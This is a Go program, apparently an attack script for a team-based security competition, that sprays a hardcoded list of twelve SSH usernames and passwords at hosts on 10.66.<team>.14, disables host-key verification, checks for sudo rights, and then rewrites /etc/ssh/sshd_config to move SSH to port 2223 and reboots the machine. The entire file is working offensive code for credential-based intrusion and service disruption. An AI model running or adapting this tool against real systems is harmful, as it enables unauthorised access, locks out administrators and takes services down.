package main

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

type cred struct {
	user string
	pass string
}

// Admin/sudo users first, then regular employees
var creds = []cred{
	{"mike", "Bar-Large-Tower1"},
	{"bob", "Ka3l3bs#1"},
	{"craig", "Worse-Shade7-Happened"},
	{"sybil", "Slide7-Cannot-Hurried"},
	{"alice", "Sets0-Break-Subject"},
	{"chad", "Substance-Disappear-While8"},
	{"trudy", "Past-Onto7-Atmosphere"},
	{"mallory", "Faster-Hope5-Either"},
	{"yves", "Felt-Cloud-Memory1"},
	{"judy", "Tree-Sides0-Having"},
	{"walter", "Across8-Purpose-Importance"},
	{"wendy", "Easily-Great-Father8"},
}

func attack(teamID int, wg *sync.WaitGroup) {
	defer wg.Done()
	host := fmt.Sprintf("10.66.%d.14:22", teamID)
	fmt.Printf("[*] Team %d: targeting %s\n", teamID, host)

	for _, c := range creds {
		cfg := &ssh.ClientConfig{
			User:            c.user,
			Auth:            []ssh.AuthMethod{ssh.Password(c.pass)},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         5 * time.Second,
		}

		conn, err := ssh.Dial("tcp", host, cfg)
		if err != nil {
			continue
		}

		// Test sudo access
		s, err := conn.NewSession()
		if err != nil {
			conn.Close()
			continue
		}
		s.Stdin = strings.NewReader(c.pass + "\n")
		if err := s.Run("sudo -S true"); err != nil {
			s.Close()
			conn.Close()
			continue
		}
		s.Close()

		fmt.Printf("[+] Team %d: sudo confirmed for %s\n", teamID, c.user)

		// Modify sshd_config and reboot
		s2, err := conn.NewSession()
		if err != nil {
			conn.Close()
			continue
		}
		s2.Stdin = strings.NewReader(c.pass + "\n")
		_ = s2.Run(`sudo -S sh -c "sed -i '1i Port 2223' /etc/ssh/sshd_config && reboot"`)
		s2.Close()
		conn.Close()

		fmt.Printf("[+] Team %d: sshd_config poisoned + reboot sent via %s\n", teamID, c.user)
		return
	}

	fmt.Printf("[-] Team %d: no working sudo credentials\n", teamID)
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintf(os.Stderr, "usage: %s <teamID> [teamID...]\n", os.Args[0])
		os.Exit(1)
	}

	var wg sync.WaitGroup
	for _, arg := range os.Args[1:] {
		id, err := strconv.Atoi(arg)
		if err != nil {
			fmt.Fprintf(os.Stderr, "invalid team ID: %s\n", arg)
			continue
		}
		wg.Add(1)
		go attack(id, &wg)
	}
	wg.Wait()
}
